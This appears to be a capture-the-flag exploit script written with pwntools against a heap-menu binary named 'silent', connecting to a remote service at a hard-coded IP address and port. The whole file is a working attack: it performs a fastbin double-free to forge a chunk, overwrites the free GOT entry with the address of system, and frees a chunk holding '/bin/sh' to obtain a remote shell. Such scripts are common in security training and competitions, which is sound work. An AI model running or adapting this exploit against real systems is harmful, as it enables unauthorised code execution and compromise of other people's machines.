#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./silent"
ENV = {"LD_PRELOAD":"./libc.so.6"}

target_addr = 0x60209d
free_got = 0x602018
system_plt = 0x400730

#p = process(elf)
p = remote("39.107.32.132", 10000) 

def add(size, s):
    sleep(1)
    p.sendline("1")
    p.sendline(str(size))
    p.sendline(s)

def free(idx):
    sleep(1)
    p.sendline("2")
    p.sendline(str(idx))

def edit(idx, s):
    sleep(1)
    p.sendline("3")
    p.sendline(str(idx))
    p.sendline(s)


p.recvuntil("==+RWBXtIRRV+.+IiYRBYBRRYYIRI;VitI;=;..........:::.::;::::...;;;:.\n")
p.recvuntil("\n")
p.recvuntil("\n")
add(0x68, "A")  # 0
add(0x68, "B")  # 1
add(0x68, "/bin/sh")  # 2

free(0)
free(1)
free(0)
add(0x68, p64(target_addr))
add(0x68, "E")
add(0x68, "F")

payload = p8(0)*0x13
payload += p64(0x602018)
add(0x68, payload)

edit(0, "\x30\x07\x40\x00\x00\x00")
free(2)

p.interactive()
